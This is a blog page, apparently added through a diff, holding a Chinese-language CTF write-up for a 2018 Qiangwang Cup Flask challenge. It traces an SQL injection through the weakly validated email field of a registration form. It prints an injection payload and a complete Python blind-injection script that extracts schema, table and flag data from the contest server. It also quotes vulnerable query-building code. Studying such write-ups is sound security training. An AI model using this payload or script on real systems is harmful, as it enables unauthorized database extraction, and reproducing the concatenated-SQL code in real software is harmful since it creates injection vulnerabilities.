@@ -1,0 +1,1208 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+
+<head>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+  <meta name="baidu-site-verification" content="cqIhQLk06F" />
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="CTF,writeup,web,flask," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Chybeta" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.0" />
+
+
+
+
+
+
+<meta name="description" content="强网杯：Python is the best language-writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Python is the best language-writeup">
+<meta property="og:url" content="http://chybeta.github.io/2018/03/25/Python-is-the-best-language-writeup/index.html">
+<meta property="og:site_name" content="Chybeta">
+<meta property="og:description" content="强网杯：Python is the best language-writeup">
+<meta property="og:image" content="https://xianzhi.aliyun.com/forum/media/upload/picture/20180325210716-71472a80-302d-1.jpeg">
+<meta property="og:image" content="https://xianzhi.aliyun.com/forum/media/upload/picture/20180325210703-699fb630-302d-1.jpeg">
+<meta property="og:image" content="https://xianzhi.aliyun.com/forum/media/upload/picture/20180325210611-4aa7837a-302d-1.jpeg">
+<meta property="og:image" content="https://xianzhi.aliyun.com/forum/media/upload/picture/20180325210651-62471a68-302d-1.jpeg">
+<meta property="og:image" content="https://xianzhi.aliyun.com/forum/media/upload/picture/20180325210627-54001108-302d-1.jpeg">
+<meta property="og:image" content="https://xianzhi.aliyun.com/forum/media/upload/picture/20180325210556-416f6304-302d-1.jpeg">
+<meta property="og:updated_time" content="2018-03-26T10:07:03.810Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Python is the best language-writeup">
+<meta name="twitter:description" content="强网杯：Python is the best language-writeup">
+<meta name="twitter:image" content="https://xianzhi.aliyun.com/forum/media/upload/picture/20180325210716-71472a80-302d-1.jpeg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    sidebar: {"position":"left","display":"post"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 'undefined',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://chybeta.github.io/2018/03/25/Python-is-the-best-language-writeup/"/>
+
+
+
+
+
+  <title> Python is the best language-writeup | Chybeta </title>
+  <!-- Google AdSense start -->
+  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<script>
+  (adsbygoogle = window.adsbygoogle || []).push({
+    google_ad_client: "ca-pub-3467872413268634",
+    enable_page_level_ads: true
+  });
+</script>
+  <!-- Google AdSense end -->
+  <meta name="baidu_union_verify" content="4dcd229ee2a964611d56cf139346dc50"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?c9c37af8d1f8c5ce0455bd146b47dd7c";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">Chybeta</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+    
+      <p class="site-subtitle"></p>
+    
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-link">
+          <a href="/link" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-flag"></i> <br />
+            
+            朋友
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于我
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup">
+ <span class="search-icon fa fa-search"></span>
+ <input type="text" id="local-search-input">
+ <div id="local-search-result"></div>
+ <span class="popup-btn-close">close</span>
+</div>
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <link itemprop="mainEntityOfPage" href="http://chybeta.github.io/2018/03/25/Python-is-the-best-language-writeup/">
+
+  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="name" content="chybeta">
+    <meta itemprop="description" content="">
+    <meta itemprop="image" content="/images/avatar.gif">
+  </span>
+
+  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="Chybeta">
+    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
+      <img style="display:none;" itemprop="url image" alt="Chybeta" src="">
+    </span>
+  </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                Python is the best language-writeup
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-03-25T19:07:59+08:00">
+                2018-03-25
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/writeup-Web/" itemprop="url" rel="index">
+                    <span itemprop="name">writeup:Web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+
+          
+          
+             <span id="/2018/03/25/Python-is-the-best-language-writeup/" class="leancloud_visitors" data-flag-title="Python is the best language-writeup">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><a href="https://xianzhi.aliyun.com/forum/topic/2219" target="_blank" rel="external">强网杯：Python is the best language-writeup</a><br><a id="more"></a></p>
+<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>Python is the best language 1/2<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">http://39.107.32.29:20000</div><div class="line"></div><div class="line">http://117.50.16.51:20000</div><div class="line"></div><div class="line">下载地址</div><div class="line">备用下载地址（密码：rtou）</div><div class="line"></div><div class="line">I&apos;m learning the flask recently,and I think python is the best language in the world!don&apos;t you think so?</div></pre></td></tr></table></figure></p>
+<h1 id="Python-is-the-best-language-1"><a href="#Python-is-the-best-language-1" class="headerlink" title="Python is the best language 1"></a>Python is the best language 1</h1><p>源码下载下来后，由于是基于flask框架，因此先看了看路由文件<code>routes.py</code>，大概如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@app.before_request</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">before_request</span><span class="params">()</span>:</span></div><div class="line"></div><div class="line"><span class="meta">@app.teardown_request</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">shutdown_session</span><span class="params">(exception=None)</span>:</span></div><div class="line"></div><div class="line"><span class="meta">@app.route('/', methods=['GET', 'POST'])</span></div><div class="line"><span class="meta">@app.route('/index', methods=['GET', 'POST'])</span></div><div class="line"><span class="meta">@login_required</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></div><div class="line"></div><div class="line"><span class="meta">@app.route('/explore')</span></div><div class="line"><span class="meta">@login_required</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">explore</span><span class="params">()</span>:</span></div><div class="line"></div><div class="line"><span class="meta">@app.route('/logout')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">()</span>:</span></div><div class="line"></div><div class="line"><span class="meta">@app.route('/register', methods=['GET', 'POST'])</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">()</span>:</span></div><div class="line"></div><div class="line"><span class="meta">@app.route('/user/&lt;username&gt;')</span></div><div class="line"><span class="meta">@login_required</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">user</span><span class="params">(username)</span>:</span></div><div class="line"></div><div class="line"><span class="meta">@app.route('/edit_profile', methods=['GET', 'POST'])</span></div><div class="line"><span class="meta">@login_required</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_profile</span><span class="params">()</span>:</span></div><div class="line"></div><div class="line"><span class="meta">@app.route('/follow/&lt;username&gt;')</span></div><div class="line"><span class="meta">@login_required</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">follow</span><span class="params">(username)</span>:</span></div><div class="line"></div><div class="line"><span class="meta">@app.route('/unfollow/&lt;username&gt;')</span></div><div class="line"><span class="meta">@login_required</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">unfollow</span><span class="params">(username)</span>:</span></div></pre></td></tr></table></figure></p>
+<p>这些功能大部分是基于登陆的，因此从注册和登陆相关的代码入手。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@app.route('/register', methods=['GET', 'POST'])</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">if</span> current_user.is_authenticated:</div><div class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</div><div class="line">    form = RegistrationForm()</div><div class="line">    <span class="keyword">if</span> form.validate_on_submit():</div><div class="line">        res = mysql.Add(<span class="string">"user"</span>, [<span class="string">"NULL"</span>, <span class="string">"'%s'"</span> % form.username.data, <span class="string">"'%s'"</span> % form.email.data,</div><div class="line">                                 <span class="string">"'%s'"</span> % generate_password_hash(form.password.data), <span class="string">"''"</span>, <span class="string">"'%s'"</span> % now()])</div><div class="line">        <span class="keyword">if</span> res == <span class="number">1</span>:</div><div class="line">            flash(<span class="string">'Congratulations, you are now a registered user!'</span>)</div><div class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'login'</span>))</div><div class="line">    <span class="keyword">return</span> render_template(<span class="string">'register.html'</span>, title=<span class="string">'Register'</span>, form=form)</div></pre></td></tr></table></figure></p>
+<p>跟进<code>RegistrationForm</code>，定义在 <code>forms.py</code>的第20行:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">RegistrationForm</span><span class="params">(FlaskForm)</span>:</span></div><div class="line">    username = StringField(<span class="string">'Username'</span>, validators=[DataRequired()])</div><div class="line">    email = StringField(<span class="string">'Email'</span>, validators=[DataRequired(), Email()])</div><div class="line">    password = PasswordField(<span class="string">'Password'</span>, validators=[DataRequired()])</div><div class="line">    password2 = PasswordField(</div><div class="line">        <span class="string">'Repeat Password'</span>, validators=[DataRequired(), EqualTo(<span class="string">'password'</span>)])</div><div class="line">    submit = SubmitField(<span class="string">'Register'</span>)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">validate_username</span><span class="params">(self, username)</span>:</span></div><div class="line">        <span class="keyword">if</span> re.match(<span class="string">"^[a-zA-Z0-9_]+$"</span>, username.data) == <span class="keyword">None</span>:</div><div class="line">            <span class="keyword">raise</span> ValidationError(<span class="string">'username has invalid charactor!'</span>)</div><div class="line">        user = mysql.One(<span class="string">"user"</span>, &#123;<span class="string">"username"</span>: <span class="string">"'%s'"</span> % username.data&#125;, [<span class="string">"id"</span>])</div><div class="line">        <span class="keyword">if</span> user != <span class="number">0</span>:</div><div class="line">            <span class="keyword">raise</span> ValidationError(<span class="string">'Please use a different username.'</span>)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">validate_email</span><span class="params">(self, email)</span>:</span></div><div class="line">        user = mysql.One(<span class="string">"user"</span>, &#123;<span class="string">"email"</span>:  <span class="string">"'%s'"</span> % email.data&#125;, [<span class="string">"id"</span>])</div><div class="line">        <span class="keyword">if</span> user != <span class="number">0</span>:</div><div class="line">            <span class="keyword">raise</span> ValidationError(<span class="string">'Please use a different email address.'</span>)</div></pre></td></tr></table></figure></p>
+<p>在这里可以很明显的看到两个验证函数有差别，<code>validate_username</code>在进行<code>mysql.One</code>前进行了正则匹配的过滤和审核，而<code>validate_email</code>仅仅通过<code>validators=[DataRequired(), Email()]</code>来匹配。</p>
+<p><code>Email</code>定义在<code>wtforms.validators</code>中，相关源码如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Email</span><span class="params">(Regexp)</span>:</span></div><div class="line">    <span class="string">"""</span></div><div class="line">    Validates an email address. Note that this uses a very primitive regular</div><div class="line">    expression and should only be used in instances where you later verify by</div><div class="line">    other means, such as email activation or lookups.</div><div class="line">    :param message:</div><div class="line">        Error message to raise in case of a validation error.</div><div class="line">    """</div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, message=None)</span>:</span></div><div class="line">        self.validate_hostname = HostnameValidation(</div><div class="line">            require_tld=<span class="keyword">True</span>,</div><div class="line">        )</div><div class="line">        super(Email, self).__init__(<span class="string">r'^.+@([^.@][^@]+)$'</span>, re.IGNORECASE, message)</div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__call__</span><span class="params">(self, form, field)</span>:</span></div><div class="line">        message = self.message</div><div class="line">        <span class="keyword">if</span> message <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">            message = field.gettext(<span class="string">'Invalid email address.'</span>)</div><div class="line">        match = super(Email, self).__call__(form, field, message)</div><div class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.validate_hostname(match.group(<span class="number">1</span>)):</div><div class="line">            <span class="keyword">raise</span> ValidationError(message)</div></pre></td></tr></table></figure></p>
+<p>其正则规则为<code>^.+@([^.@][^@]+)$</code>，也就是说对email而言，即使提交如<code>&#39;&quot;#a@q.com</code>包含单引号，双引号，注释符等敏感字符的形式也是能通过的。</p>
+<p>回到<code>validate_email</code>验证函数中：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">validate_email</span><span class="params">(self, email)</span>:</span></div><div class="line">    user = mysql.One(<span class="string">"user"</span>, &#123;<span class="string">"email"</span>:  <span class="string">"'%s'"</span> % email.data&#125;, [<span class="string">"id"</span>])</div><div class="line">    <span class="keyword">if</span> user != <span class="number">0</span>:</div><div class="line">        <span class="keyword">raise</span> ValidationError(<span class="string">'Please use a different email address.'</span>)</div></pre></td></tr></table></figure></p>
+<p>跟入<code>mysql.One</code>，定义在others.py:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># mysql.One("user", &#123;"email":  "'%s'" % email.data&#125;, ["id"])</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">One</span><span class="params">(self, tablename, where=&#123;&#125;, feildname=[<span class="string">"*"</span>], order=<span class="string">""</span>, where_symbols=<span class="string">"="</span>, l=<span class="string">"and"</span>)</span>:</span></div><div class="line">    <span class="comment"># self.Sel("user", &#123;"email":  "'%s'" % email.data&#125;, ["id"], "", "=", l)</span></div><div class="line">    sql = self.Sel(tablename, where, feildname, order, where_symbols, l)</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        res = self.db_session.execute(sql).fetchone()</div><div class="line">        <span class="keyword">if</span> res == <span class="keyword">None</span>:</div><div class="line">            <span class="keyword">return</span> <span class="number">0</span></div><div class="line">        <span class="keyword">return</span> res</div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        <span class="keyword">return</span> <span class="number">-1</span></div><div class="line">``` </div><div class="line"></div><div class="line">跟入`self.Sel`:</div><div class="line">```python</div><div class="line"><span class="comment"># self.Sel("user", &#123;"email":  "'%s'" % email.data&#125;, ["id"], "", "=", l)</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Sel</span><span class="params">(self, tablename, where=&#123;&#125;, feildname=[<span class="string">"*"</span>], order=<span class="string">""</span>, where_symbols=<span class="string">"="</span>, l=<span class="string">"and"</span>)</span>:</span></div><div class="line">    sql = <span class="string">"select "</span></div><div class="line">    sql += <span class="string">""</span>.join(i + <span class="string">","</span> <span class="keyword">for</span> i <span class="keyword">in</span> feildname)[:<span class="number">-1</span>] + <span class="string">" "</span></div><div class="line">    sql += <span class="string">"from "</span> + tablename + <span class="string">" "</span></div><div class="line">    <span class="keyword">if</span> where != &#123;&#125;:</div><div class="line">        sql += <span class="string">"where "</span> + <span class="string">""</span>.join(i + <span class="string">" "</span> + where_symbols + <span class="string">" "</span> +</div><div class="line">                                    str(where[i]) + <span class="string">" "</span> + l + <span class="string">" "</span> <span class="keyword">for</span> i <span class="keyword">in</span> where)[:<span class="number">-4</span>]</div><div class="line">    <span class="keyword">if</span> order != <span class="string">""</span>:</div><div class="line">        sql += <span class="string">"order by "</span> + <span class="string">""</span>.join(i + <span class="string">","</span> <span class="keyword">for</span> i <span class="keyword">in</span> order)[:<span class="number">-1</span>]</div><div class="line">    <span class="keyword">return</span> sql</div></pre></td></tr></table></figure></p>
+<p>最后拼接出来的sql语句如下：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> email = <span class="string">'your input email'</span></div></pre></td></tr></table></figure></p>
+<p>结合前面所说的对输入邮箱email形式的验证，这里存在sql注入漏洞。我们设置邮箱为<code>test&#39;/**/or/**/1=1#@test.com</code>，则拼接后的sql语句为：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> email = <span class="string">'test'</span><span class="comment">/**/</span><span class="keyword">or</span><span class="comment">/**/</span><span class="number">1</span>=<span class="number">1</span>#@test.com<span class="string">'</span></div></pre></td></tr></table></figure></p>
+<p>可以看到成功注入。由于此处不能回显数据，因此采用盲注。回到<code>validate_username</code><br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">validate_username</span><span class="params">(self, username)</span>:</span></div><div class="line">    <span class="keyword">if</span> re.match(<span class="string">"^[a-zA-Z0-9_]+$"</span>, username.data) == <span class="keyword">None</span>:</div><div class="line">        <span class="keyword">raise</span> ValidationError(<span class="string">'username has invalid charactor!'</span>)</div><div class="line">    user = mysql.One(<span class="string">"user"</span>, &#123;<span class="string">"username"</span>: <span class="string">"'%s'"</span> % username.data&#125;, [<span class="string">"id"</span>])</div><div class="line">    <span class="keyword">if</span> user != <span class="number">0</span>:</div><div class="line">        <span class="keyword">raise</span> ValidationError(<span class="string">'Please use a different username.'</span>)</div></pre></td></tr></table></figure></p>
+<p>当查询为真时也即<code>user != 0</code>会出现信息<code>Please use a different username.</code>，结合这点构造出最后的exp.py：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</div><div class="line"></div><div class="line">url = <span class="string">"http://39.107.32.29:20000/register"</span></div><div class="line"></div><div class="line">r = requests.get(url)</div><div class="line">soup = BeautifulSoup(r.text,<span class="string">"html5lib"</span>)</div><div class="line">token = soup.find_all(id=<span class="string">'csrf_token'</span>)[<span class="number">0</span>].get(<span class="string">"value"</span>)</div><div class="line"></div><div class="line">notice = <span class="string">"Please use a different email address."</span></div><div class="line">result = <span class="string">""</span></div><div class="line"></div><div class="line">database = <span class="string">"(SELECT/**/GROUP_CONCAT(schema_name/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/INFORMATION_SCHEMA.SCHEMATA)"</span></div><div class="line">tables = <span class="string">"(SELECT/**/GROUP_CONCAT(table_name/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/INFORMATION_SCHEMA.TABLES/**/WHERE/**/TABLE_SCHEMA=DATABASE())"</span></div><div class="line">columns = <span class="string">"(SELECT/**/GROUP_CONCAT(column_name/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/WHERE/**/TABLE_NAME=0x666c616161616167)"</span></div><div class="line">data = <span class="string">"(SELECT/**/GROUP_CONCAT(flllllag/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/flaaaaag)"</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</div><div class="line">        payload = <span class="string">"test'/**/or/**/ascii(substr("</span>+  data +<span class="string">",%d,1))=%d#/**/@chybeta.com"</span> % (i,j)</div><div class="line">        <span class="keyword">print</span> payload</div><div class="line">        post_data = &#123;</div><div class="line">            <span class="string">'csrf_token'</span>: token,</div><div class="line">            <span class="string">'username'</span>: <span class="string">'a'</span>,</div><div class="line">            <span class="string">'email'</span>:payload,</div><div class="line">            <span class="string">'password'</span>:<span class="string">'a'</span>,</div><div class="line">            <span class="string">'password2'</span>:<span class="string">'a'</span>,</div><div class="line">            <span class="string">'submit'</span>:<span class="string">'Register'</span></div><div class="line">        &#125;</div><div class="line">        r = requests.post(url,data=post_data)</div><div class="line">        soup = BeautifulSoup(r.text,<span class="string">"html5lib"</span>)</div><div class="line">        token = soup.find_all(id=<span class="string">'csrf_token'</span>)[<span class="number">0</span>].get(<span class="string">"value"</span>)</div><div class="line">        <span class="keyword">if</span> notice <span class="keyword">in</span> r.text:</div><div class="line">            result += chr(j)</div><div class="line">            <span class="keyword">print</span> result</div><div class="line">            <span class="keyword">break</span></div></pre></td></tr></table></figure></p>
+<p>由于在注册部分有csrf_token，因此在每次submit时要记得带上，同时在每次返回的页面中取得下一次的csrf_token。</p>
+<p>最后的flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">QWB&#123;us1ng_val1dator_caut1ous&#125;</div></pre></td></tr></table></figure></p>
